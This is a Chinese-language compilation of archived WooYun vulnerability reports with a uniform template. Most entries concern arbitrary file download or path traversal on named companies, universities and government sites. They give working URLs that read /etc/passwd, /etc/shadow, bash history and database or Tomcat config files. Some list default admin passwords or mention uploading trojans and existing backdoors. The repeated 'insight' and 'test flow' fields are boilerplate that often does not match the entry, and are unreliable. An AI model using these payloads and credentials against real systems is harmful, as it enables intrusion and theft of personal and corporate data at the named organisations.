**POC**: http://guf521656.h163.92hezu.org/index.php?controller=down&file=L3VwbG9hZC9cLi5cY29uZmlnLnBocA==

**绕过**: 直接利用

**修复**: 直接过滤/和\就行了
---

---
### [wooyun-2013-036713] 某新闻源数据库Data文件下载
**厂商**: 阜阳日报社 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.fynews.net/Data/data.rar可下载。。我会告诉你旁站的data.Rar全部可以下载吗？？

**POC**: 同上

**绕过**: 直接利用

**修复**: 禁止下访问目录权限
---

---
### [wooyun-2014-062750] 中企动力某站任意文件下载可导致服务器沦陷
**厂商**: 中企动力科技股份有限公司 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误

**元思考**: 触发信号: 功能测试

**洞察**: 网络设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别网络设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 起因：谷歌到一个订单跟进系统：http://119.10.113.102:586/manage/login.asp习惯性试了下'or'='or' 没法进去= =，好吧 看到旁边有一个操作手册下载 地址：http://119.10.113.102:8000/download_file.asp?FileName=caozuoshouce_040705.doc- -渗透就从这里开始的首先打开http://119.10.113.102:8000/ 看看是什么吧 = = 自动跳到http://119.10.113.102:8000/admin/login.asp忽然好奇了，想进去看看试了下是否存在任意文件下载漏洞，http://119.10.113.102:8000/download_file.asp?FileName=./../admin/login.asp  哇 下载下来了习惯性去把../inc

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 数据库就不要外连了吧，下载文件的地方做下过滤吧 匿了
---

---
### [wooyun-2015-0119847] 东方电气某平台配置不当（已被挂马）
**厂商**: dongfang.com | **年份**: 2015 | **类型**: 应用配置错误

**元思考**: 触发信号: 功能测试

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.IIS配置不当，多目录可列表，敏感文件可下载2.漏洞较多，已被挂马http://dzzb.dfstw.com/best.asp.asp

**POC**: 见上面

**绕过**: 直接利用

**修复**: 修补代码，注意IIS配置
---

---
### [wooyun-2015-0137591] 宝洁中国某漏洞导致敏感信息泄露（涉及大量供应商以及客户电话、住址、银行卡号等等）
**厂商**: 宝洁中国 | **年份**: 2015 | **类型**: 内部绝密信息泄漏

**元思考**: 触发信号: 认证接口

**洞察**: 内部绝密信息泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别内部绝密信息泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件下载，导致配置文件下载可以看到ftp和数据库的账号密码用这个账号密码登陆ftp，里面有些内部秘密资料登陆数据库，大量敏感信息，里面有上千个表全国一万三千多个订单信息，包括客户和商户的姓名电话，订单金额，是否付款等等583家门店管理员的账户密码4857个门店主管电话400多个仓库管理员姓名，电话，邮箱，手机，部分银行卡账号等等550个服务商主管手机号，邮箱，银行账户等等信息还有很多机密资料，就不一一证明了，应该算是宝洁中国重要的数据库了吧！

**POC**: 已证明

**绕过**: 直接利用

**修复**: 你懂的
---

---
### [wooyun-2015-096179] 金蝶EAS任意文件读取
**厂商**: 金蝶 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://XX.com/portal/logoImgServlet?language=ch&dataCenter=&insId=insId&type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow%00通过google hack找了几个最新版本的系统，均可利用，而且由于Web应用启动权限较大，可直接获linux下的shadow文件，进行暴力破解。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 对该页面的type参数进行有效过滤
---

---
### [wooyun-2015-0164795] 百度某服务器配置不当任意文件读取(可读shadow)
**厂商**: 百度 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://180.76.153.81/扫描的目标就是百度再加上下面信息 基本确认是百度ipcurl http://180.76.153.81:80/../../../../../../../../../../../../../etc/passwdcurl http://180.76.153.81:80/../../../../../../../../../../../../../etc/shadow

**POC**: http://180.76.153.81/扫描的目标就是百度再加上下面信息 基本确认是百度ipcurl http://180.76.153.81:80/../../../../../../../../../../../../../etc/passwdcurl http://180.76.153.81:80/../../../../../../../../../../../../../etc/shadow

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0102811] 如家某服务器配置不当导致各种敏感数据泄露
**厂商**: 如家酒店集团 | **年份**: 2015 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如家最近挺火，也来凑个热闹。漏洞过于明显鉴于厂商隐私安全标题就不写那么明白啦...## 看域名瞅到##目录遍历各接口外泄##down了几个dll反汇编看了下，无果，dll比较敏感相当于源码了

**POC**: #瞄到这块经验告诉我有注入http://api.homeinns.com/CrsWebSrv_CV2/CrsWebSrv.asmx果然SOAP协议urn:strLicences参数存在注入，包括莫泰酒店数据[*] ACT[*] CRS[*] CRS_HistoryData[*] Crs_OrderNo_Builder[*] HCS[*] HHotel[*] homeinns[*] Hotel[*] ICRSDB[*] IVRData[*] mapbar[*] master[*] MDEC[*] model[*] MotelHCS[*] msdb[*] MT_AgentDB[*] MT_CRS[

**绕过**: 直接利用

**修复**: 懂...
---

---
### [wooyun-2013-043571] 搜狐畅游某分站备份文件下载
**厂商**: 搜狐畅游 | **年份**: 2013 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 搜狐畅游备份文件下载下载地址：https://auth.changyou.com/auth.zip反编译class文件 能看到登陆密钥之类private static final long serialVersionUID = 0x30bfa17e7c7ef7c8L;private Logger logger;private ServletContext app;private CasService casService;private LoginService loginService;private String logoutForm;private String genericSuccess;private String clientLogout;private String alloweDomian;private static String KEY = "(*&*^hao*_+=

**POC**: 搜狐畅游备份文件下载下载地址：https://auth.changyou.com/auth.zip反编译class文件 能看到登陆密钥之类private static final long serialVersionUID = 0x30bfa17e7c7ef7c8L;private Logger logger;private ServletContext app;private CasService casService;private LoginService loginService;private String logoutForm;private String genericSucce

**绕过**: 直接利用

**修复**: 删除
---

---
### [wooyun-2012-013274] anwsion任意文件下载漏洞
**厂商**: anwsion.com | **年份**: 2012 | **类型**: 

**元思考**: 触发信号: 功能测试

**洞察**: 防护不足，开发者信任前端输入

**测试流程**:
1. 识别相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不解释，代码逻辑有问题。http://wenda.anwsion.com/file/download/?file_name=Y29uZmlnLnBocA==&url=Lmh0dHA6Ly93ZW5kYS5hbndzaW9uLmNvbS91cGxvYWRzLi9zeXN0ZW0vY29uZmlnL2RhdGFiYXNlLnBocA==

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 检查下吧
---

---
### [wooyun-2015-0122751] 链家地产旗下子站点存在遍历可下载房屋合同+部分租客信息
**厂商**: homelink.com.cn | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://119.254.70.76/#1 网站路径+数据库user泄露http://119.254.70.76/job.php#2 目录遍历http://119.254.70.76/cachehttp://119.254.70.76/upload1http://119.254.70.76/config/http://119.254.70.76/include/http://119.254.70.76/apihttp://119.254.70.76/statichttp://119.254.70.76/pagehttp://119.254.70.76/payment在http://119.254.70.76/upload1/中可以下载合同，里面部分含有租客信息

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-09838] Phpcms 2008 sp4服务器任意文件下载漏洞
**厂商**: phpcms | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 后台管理

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 发现这个漏洞源于对www.wodota.com/test.txt的一次检测社工进入后台，文件管理器能用，后缀限制，加上服务器有变态是智创IIS防火墙，导致特殊文件夹，注入，解析漏洞等等，都不能用，最终发现这个漏洞，并在C盘下智创目录下载了智创IIS防火墙的配置文件，得到了防火墙账号及md5密码，通过web管理关掉防火墙，才得以进一步渗透。来看admin目录下的filemanager.inc.php文件"?mod=$mod&file=$file&action=edit&fname=$mkfile&dir=".urlencode($dir));这是edit的代码，当然down就一样了，fname虽然不好限定，但是前后没有对$dir做任何限制，所以可以导致自定义dir来下载文件。比如构造下载php.inihttp://www.abc.com/admin.php?mod=phpcms&file=f

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2014-062320] 多所大学校友网任意文件下载
**厂商**: 多所大学校友网 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 校友网漏洞POC：/xyzhxt/showpage/fjxz.jsp?fjlj=/WEB-INF/web.xml

**POC**: 相关学校网站：alumni.zstu.edu.cn/xyzhxt/ 浙江理工大学校友网xyzh.gxnu.edu.cn/xyzhxt/  广西师范大学校友总会alumni.ahu.edu.cn/xyzhxt/  安徽大学xyzh.jsu.edu.cn/xyzhxt/‎  吉首大学校友网xiaoyouhui.szpt.edu.cn/xyzhxt/  深圳职业技术学院校友网可能涉及更多学校。

**绕过**: 直接利用

**修复**: 文件名称添加过滤。
---

---
### [wooyun-2015-0117978] 和讯网某处任意文件读取+未授权访问
**厂商**: 和讯网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 任意文件读取Url:http://60.28.250.132:8008/未授权访问60.28.250.171 11211这段都是和讯网的，扫描了一下端口还是有意外发现的。如何证明目标公司的。该网站能判断目标公司大概属于的网段：inetnum:        60.28.250.0 - 60.28.251.255netname:        hexun-Ltdcountry:        CNdescr:          HeXun Technological Co.,Ltd他们公司的VPN地址。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0120247] 吉祥人寿某销售系统存在任意文件下载漏洞
**厂商**: 吉祥人寿 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 吉祥人寿远程出单销售系统地址：http://epos.jxlife.com.cn/ter/indexlis.jsp漏洞地址：http://epos.jxlife.com.cn/ter/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/passwd

**POC**: http://epos.jxlife.com.cn/ter/f1print/F1PrintKernelJ1.jsp?&RealPath=/etc/hostshttp://epos.jxlife.com.cn/ter/f1print/F1PrintKernelJ1.jsp?&RealPath=/root/.bash_history

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2012-010406] 多玩多个敏感信息&交换机暴露
**厂商**: 广州多玩 | **年份**: 2012 | **类型**: 默认配置不当

**元思考**: 触发信号: 后台管理

**洞察**: 默认配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别默认配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 多玩多个敏感信息暴露，交换机&后台&日志&目录遍历http://183.61.12.129/65/1admin  adminhttp://183.61.12.18:8080/敏感信息http://183.61.2.241/225/193//129admin adminhttp://113.106.100.1admin adminhttp://183.61.12.66:8080/     日志http://admin.y.duowan.com/login.jsphttps://udb.hiido.com/index.phphttp://admin.gh.duowan.com/http://mai.yy.com/admin/loginhttp://iyy.mx/login.phphttp://iyy.mx//html.phphttp://iyy.mx//test.phphttp://iyy.m

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的，求礼物
---

---
### [wooyun-2012-08453] 某省地税局某信息系统任意文件下载
**厂商**: 某省地税局 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 原始链接：http://new.xxds.gov.cn:7001/filelist/download.jsp?filename=%E5%87%8F%E5%85%8D%E7%A8%8E%E7%94%B3%E8%AF%B7%E5%A4%87%E6%A1%88%E8%A1%A8.doc其中文件下载路径参数filename没有对路径进行必要的限制！

**POC**: http://new.xxds.gov.cn:7001/filelist/download.jsp?filename=../../filelist/download.jsphttp://new.xxds.gov.cn:7001/filelist/download.jsp?filename=../../../../conf/tomcat-users.xmlhttp://new.xxds.gov.cn:7001/manager/html/可上传war木马...

**绕过**: 直接利用

**修复**: 对下载路径做必要的限制！
---

---
### [wooyun-2014-061839] YouYaX主站任意文件下载漏洞
**厂商**: youyax.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 参数注入

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: YouYax主站存在任意文件遍历/下载漏洞，可跨目录页面：www.youyax.com/download.php参数：name构造类似以下链接，可以下载任意系统文件，网站程序源代码等等www.youyax.com/download.php?name=../../../../../../../../../../etc/passwdwww.youyax.com/download.php?name=../../../../../../../../../../etc/resolv.confwww.youyax.com/download.php?name=../index.php

**POC**: 如上

**绕过**: 直接利用

**修复**: 正确过滤相应参数
---

---
### [wooyun-2013-022273] 某法院邮箱系统目录遍历+数据库信息泄漏（某邮箱系统通用问题）
**厂商**: 某法院 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 最高人民法院邮箱系统目录遍历http://mail.court.gov.cn/include/数据库信息泄漏http://mail.court.gov.cn/include/config.inc说明：未做任何深入了解，随便打开个目录看了下。谢绝快递！！！

**POC**: <?include( "include/global.php" );define('MYSQL_HOST', "localhost");define('MYSQL_PORT', "3306");define('MYSQL_USER', "root");define('MYSQL_PASS', "");define('MYSQL_DB', "archive");define('TIMEOUT', 60 );define('MAIL_HOST', "127.0.0.1" );define('MAIL_PORT', 9998 );define('MAX_SYSTEM_YEAR', 15);defin

**绕过**: 直接利用

**修复**: 太老的邮箱系统了，换了吧！
---

---
### [wooyun-2015-0162396] 中粮集团有限公司某站任意登录及任意文件下载（疑似设备后门可绕过管理密码）
**厂商**: 中粮集团有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://hz.cofcopack.com:8015/ 中粮包装具体使用看YY大神的 http://wooyun.org/bugs/wooyun-2010-0132689登录抓包然后 账号admin 密码后缀%26就进去了任意文件下载 在需要下载的文件后门加.即可

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2012-07709] 支付宝某子站任意文件下载漏洞
**厂商**: 支付宝 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://job.alipay.com/index.php?r=resume/edit在简历里附件那里随便上传一个文件，然后通过firebug 修改Resumeattachment[oldattachurl_resume]的表单的路径为要下载文件的路径，然后保存。再预览。下载，即可下载对应的文件。看图吧。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 应该懂得！
---

---
### [wooyun-2015-095283] Nielsen尼尔森大中华地区数据下载服务器弱口令
**厂商**: Nielsen尼尔森 | **年份**: 2015 | **类型**: 服务弱口令

**元思考**: 触发信号: 上传功能

**洞察**: 服务弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别服务弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题url:https://122.144.130.98/admin admin乐视向客户位于全国的服务器推送文件和客户端消息要是发送木马的消息或者链接后果不堪设想吧https://122.144.130.98/adminscreens/pblsh_data_screen.aspx这些数据每天上传的都是商业机密数据吧都是客户信息资料可以随意删除https://122.144.130.98/adminscreens/prg_data_screen.aspx商业数据下载https://122.144.130.98/userscreens/dwnld_data_screen.aspx数据类型https://122.144.130.98/adminscreens/data_type_list.aspx绝对类型都爆出来了环境都是绝对路径https://122.144.130.98/adminscre

**POC**: 问题url:https://122.144.130.98/admin admin乐视向客户位于全国的服务器推送文件和客户端消息要是发送木马的消息或者链接后果不堪设想吧https://122.144.130.98/adminscreens/pblsh_data_screen.aspx这些数据每天上传的都是商业机密数据吧都是客户信息资料可以随意删除https://122.144.130.98/adminscreens/prg_data_screen.aspx商业数据下载https://122.144.130.98/userscreens/dwnld_data_screen.aspx数据类型http

**绕过**: 直接利用

**修复**: 修复
---

---
### [wooyun-2015-0157279] 欧飞数卡某系统存在任意文件下载漏洞
**厂商**: ofpay.com | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://chat.ofcard.com/live800/downlog.jsp?path=/&fileName=/C:\Windows\system.ini

**POC**: http://chat.ofcard.com/live800/downlog.jsp?path=/&fileName=/C:\Windows\System32\drivers\etc\hosts

**绕过**: 直接利用

**修复**: 补丁
---

---
### [wooyun-2012-08654] 福建网龙某子站任意文件读取
**厂商**: 福建网龙 | **年份**: 2012 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 安全中心网站利用某文件可读取任意文件，例如web.config

**POC**: https://aq.91.com/AjaxAction/AC_JsFile.ashx?File=web.config同时当找不到文件的时候会爆出网站绝对路径

**绕过**: 直接利用

**修复**: 代码问题，如果只读js的话完全可以不用读取文件的函数
---

---
### [wooyun-2014-069700] 中国洋大学某站目录遍历陕西师范大学数据库配置(可外连)
**厂商**: 中国海洋大学 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 好吧 就是这个网站，是中海洋大学子网站之一，直接访问可以。好吧 下载一个文件 就这么简单。咱们看看接下来会发生什么！恩 都素管理员哈，好吧 我接下来看看其他的呃 很多学生的情况哈，还不错 挺多妹子 话说。。。这数据库好乱的说，管理员您老人家不累吗？后勤管理好好看看行不行，看着我都眼晕。。。。。。。。。

**POC**: 好吧 就是这个网站，是中海洋大学子网站之一，直接访问可以。好吧 下载一个文件 就这么简单。咱们看看接下来会发生什么！恩 都素管理员哈，好吧 我接下来看看其他的呃 很多学生的情况哈，还不错 挺多妹子 话说。。。这数据库好乱的说，管理员您老人家不累吗？后勤管理好好看看行不行，看着我都眼晕。。。。。。。。。

**绕过**: 直接利用

**修复**: 你们比我懂的多吧。。。新手，手下留情 ，多一点点rank
---

---
### [wooyun-2016-0206336] 信诺立域名商某网站泄露众多公司ICP信息+存在后门（涉及省市甚至国字头网站ICP等信息）
**厂商**: 信诺立 | **年份**: 2016 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一：信诺立因特网接入服务提供商（ISP）ICP/IP地址信息备案管理系统泄露众多公司ICP信息（涉及省市甚至国字头网站ICP信息）目录遍历，可下载备份文件，涉及众多ICP等信息**.**.**.**:88https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/其余目录遍历自查icp等信息截图不全，信息包括姓名、邮箱、备案号、地址、电话等，非常详细第二：**.**.**.**:88/phpMyAdmin.rar 文件下载，泄露phpmyadmin各种信息第三：后门发现2012年后门：**.**.**.**:88https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/201007/jm.php admin权限为apache扫了下，发现众多木马通过后门可以看到众多备份网站信息、备份域名商信息

**POC**: 已证明

**绕过**: 直接利用

**修复**: 1.备份时注意检查文件2.找家专业公司做一下安全检查（喊我喊我喊我）3.注意网站漏洞修补4.等
---

---
### [wooyun-2012-011165] kappa后台帐号密码泄漏
**厂商**: kappa | **年份**: 2012 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 认证接口, 后台管理

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 备份数据库泄漏，导致可以直接登录后台  http://www.kappa.com.cn/thinkphp.sql （已经修改）并且通过后台thinkphp文件下载功能，可以实现任意文件下载，直接读取后台数据库登录权限roothttp://www.kappa.com.cn/index.php?app=admin&mod=Tool&act=doDownload&filename=../../config.inc.php

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-065917] 山东财经大学多个学院沦陷导致数据泄露
**厂商**: 山东财经大学 | **年份**: 2014 | **类型**: 应用配置错误

**元思考**: 触发信号: 认证接口

**洞察**: 应用配置错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别应用配置错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 尝试mysql连接，无果，没有开启外连但是找到敏感目录http://www3.sdufe.edu.cn/ppMyAdmin/phpmyadmin登陆写一句话，到处即可不知道是否还需详细截图

**POC**: 有了数据库信息，登陆phpmyadmin忽然想起来并没有web物理路径，不能省事了。那就从后台着手了添加一条有salt，百度可找到加密方式，看来有人来过了。

**绕过**: 直接利用

**修复**: 升级
---

---
### [wooyun-2013-037292] 衢州新闻网备份文件下载（数据库账号密码泄露）
**厂商**: 衢州新闻网 | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://bk.qz828.com/1.rarhttp://houe.qz828.com/1.rarhttp://house.e.qz828.com/1.rarhttp://www.qz828.com/1.rarhttp://wwws.qz828.com/1.rarhttp://wwwt.qz828.com/1.rarhttp://wwww.qz828.com/1.rarhttp://zblog.qz828.com/1.rar全部可下载。。

**POC**: 同上

**绕过**: 直接利用

**修复**: 哥们。你想跟我说明什么么？
---

---
### [wooyun-2015-089692] 厦门天翼商城SVN信息泄漏，导致整站源代码文件下载
**厂商**: 中国电信 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://202.109.244.242/.svn/entries

**POC**: http://202.109.244.242:80/

**绕过**: 直接利用

**修复**: 删除文件
---

---
### [wooyun-2016-0171194] 东风雪铁龙两个分站配置不当导致源码泄漏+任意文件读取+多个问题打包（数据库配置信息）
**厂商**: dfyb.com | **年份**: 2016 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: SVN信息泄漏：http://c2.dongfeng-citroen.com.cn/.svn/entries数据库配置信息：奇葩点：服务器居然没有解析文件，导致任意文件源码读取另外一分站SVN泄漏：http://dealer.dongfeng-citroen.com.cn/.svn/entries数据库信息网站源码下载：http://elysee.dongfeng-citroen.com.cn/elysee.tar.gz分站：sport.dongfeng-citroen.com.cn 报错 物理路径泄漏：D:\web\test0801\分站：http://spring.dongfeng-citroen.com.cn/ MS15-034 HTTP.sys 远程执行代码

**POC**: 如上

**绕过**: 直接利用

**修复**: 一个个来 别急……看在打包提交的份儿上，给个20rank可好？
---

---
### [wooyun-2015-0164992] 多市档案局任意文件下载/后台通杀(危及档案数据库安全)
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 后台管理

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 网站是武汉市劲捷电子信息有限公司（http://**.**.**.**）提供技术支持的存在任意文件下载（可获取敏感信息）和后台设计缺陷（可直接获取帐号密码！）通杀！危及档案数据库安全！

**POC**: 任意文件下载（可获取敏感信息）如下荆州市档案局：http://**.**.**.**/news.do?method=downloadFile&fileName=../../../WEB-INF/web.xml应城市档案局：http://**.**.**.**/childNews.do?method=downloadFile&fileName=../../../WEB-INF/struts-config.xml潜江市档案局：http://**.**.**.**/news.do?method=downloadFile&fileName=../../../WEB-INF/struts-config.

**绕过**: 直接利用

**修复**: 你们更专业！感谢深蓝的热心帮助！
---

---
### [wooyun-2013-039033] 虎符传奇站点存在任意文件读取暴露数据库信息
**厂商**: 我爱游戏网 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: phpcms v9的洞

**POC**: http://www.hufucq.com/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php

**绕过**: 直接利用

**修复**: 你们更专业，游戏更快乐。
---

---
### [wooyun-2015-0128295] 凤凰网Nexus配置不当导致敏感信息泄露
**厂商**: 凤凰网 | **年份**: 2015 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 认证接口

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://220.181.67.230:8081/nexus/index.html查看IP是凤凰网用户名admin 密码admin123然后查看不登陆时也可访问

**POC**: http://220.181.67.230:8081/nexus/index.html查看IP是凤凰网用户名admin 密码admin123然后查看不登陆时也可访问

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-098733] 周大福官方网站任意文件读取（截断技巧）
**厂商**: 周大福 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: GET /tc/about/award.php?year=invalid../../../../../../../../../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 周大福土豪企业啊，怎么官网像漏勺一样那么多洞洞。 http://weibo.com/234391451   ，http://wooyun.org/teams/NEURON 欢迎小伙伴加入。
---

---
### [wooyun-2014-078733] 中国邮政主站某系统弱口令+任意文件下载漏洞
**厂商**: 中国邮政集团公司信息技术局 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是弱口令系统地址http://bk.chinapost.com.cn/vip/login.jsp需要用IE登陆弱口令账户 admin / 123456进去之后，发现找注入找不到啊，都是numberformat找到一个模板下载连接形式http://bk.chinapost.com.cn/vip/common/download/down.jsp?filename=/file/imp_examples.xls一看就是有问题的http://bk.chinapost.com.cn/vip/common/download/down.jsp?filename=/login.jsp直接下载源码http://bk.chinapost.com.cn/vip/common/download/down.jsp?filename=/etc/passwd直接读系统配置文件root:x:0:0:root:/root

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 修复弱口令，对文件下载最好是直接的xls地址或者的ID调用下载，最好不实用path之类的方式
---

---
